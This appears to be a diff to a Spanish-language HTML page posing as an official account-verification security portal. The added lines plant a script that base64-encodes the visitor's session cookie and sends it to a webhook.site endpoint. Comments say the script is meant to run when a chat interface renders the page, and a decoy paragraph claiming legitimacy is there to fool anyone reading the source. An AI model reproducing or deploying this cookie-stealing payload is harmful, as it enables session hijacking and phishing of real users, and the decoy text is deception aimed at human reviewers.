@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Portal Oficial de Seguridad - Verifica tu Cuenta</title> <!-- Título inocente -->
+    <title>Portal Oficial de Seguridad - Verifica tu Cuenta</title>
+    <!-- El payload XSS está OCULTO en el título -->
 </head>
 <body>
     <h1>Por favor, inicia sesión para verificar tu identidad.</h1>
-    <!-- Aquí podrías poner un formulario falso de login -->
+
+    <!-- CONTENIDO MALICIOSO OCULTO: Este script se ejecutará cuando el chat renderice nuestro contenido -->
+    <script>
+        // Payload Silencioso: Envía la cookie de sesión a un servidor controlado por el atacante
+        fetch('https://webhook.site/your-unique-id?exfil=' + btoa(document.cookie));
+    </script>
+
+    <!-- Contenido legítimo para engañar a cualquier humano que vea el código fuente -->
+    <p>Esta es una página legítima de verificación de seguridad.</p>
 </body>
 </html>
